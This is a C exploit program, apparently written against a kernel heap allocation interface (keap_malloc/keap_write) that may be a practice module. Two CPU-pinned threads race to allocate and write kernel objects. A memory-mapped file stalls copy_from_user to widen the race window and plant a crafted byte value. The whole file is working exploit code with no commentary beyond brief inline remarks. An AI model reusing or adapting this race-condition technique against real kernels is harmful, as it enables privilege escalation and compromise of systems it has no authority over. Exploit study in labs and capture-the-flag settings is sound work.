#include "libs/pwn.h"
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>

/*******************************
 * EXPLOIT                     *
 *******************************/

#define SLOW_FILE "/tmp/slow"
#define BUF_SIZE 8
#define SLOW_CPU 1
#define FAST_CPU 2

enum RACE { RACE_ONGOING = 0, RACE_WON, RACE_LOST };

int race_done = 0;

void *fast(void *buf) {
  void *ptr;

  linfo("starting fast thread");
  pin_cpu(0, FAST_CPU);
  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  race_done = RACE_LOST;

  keap_write(ptr, buf, BUF_SIZE);
  linfo("fast thread done");
  keap_free(ptr);
}

void *slow(void *buf) {
  void *ptr;

  linfo("starting slow thread");
  pin_cpu(0, SLOW_CPU);
  // slow down execute, increase race window

  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  race_done = RACE_WON;

  // stall copy_from_user using mmaped file
  keap_write(ptr, buf, BUF_SIZE);
  linfo("slow thread done");
  keap_free(ptr);
}

int main(int argc, char *argv[]) {
  int fd = -1;
  void *map;
  const char *buf = "\x06\xfe\x1b\xe2\0\0\0";
  pthread_t slow_t, fast_t, busy_t;

  setvbuf(stdout, NULL, _IONBF, 0);

  lstage("INIT");

  pin_cpu(0, 0);
  init();

  lstage("create slower structs");

  // create target file
  fd = SYSCHK(open(SLOW_FILE, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));

  CHK(write(fd, buf, BUF_SIZE) == BUF_SIZE);
  SYSCHK(close(fd));

  fd = SYSCHK(open(SLOW_FILE, O_RDWR));
  map = SYSCHK(mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0));

  lstage("start race");

  // create a busy thread to slow down execution
  pthread_create(&slow_t, NULL, slow, map);
  pthread_create(&fast_t, NULL, fast, (void *)buf);

  pthread_join(slow_t, NULL);
  pthread_join(fast_t, NULL);

  if (race_done == RACE_LOST)
    lerror("failed racer");

  linfo("won race!!");
}
